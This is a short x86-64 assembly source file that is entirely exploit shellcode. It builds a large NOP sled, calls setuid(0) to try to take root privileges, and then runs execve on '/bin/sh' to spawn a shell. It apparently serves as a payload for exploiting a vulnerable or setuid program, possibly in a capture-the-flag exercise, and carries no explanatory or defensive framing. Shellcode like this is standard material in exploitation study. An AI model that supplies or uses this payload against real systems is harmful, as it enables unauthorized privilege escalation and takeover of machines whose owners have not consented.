.global _start
_start:
.rept 0x800
        nop
.endr
.intel_syntax noprefix
        mov rax, 0x69
        mov rdi, 0
        syscall

        mov rax, 59
        lea rdi, [rip+binsh]
        mov rsi, 0
        mov rdx, 0
        syscall
binsh:
        .string "/bin/sh"

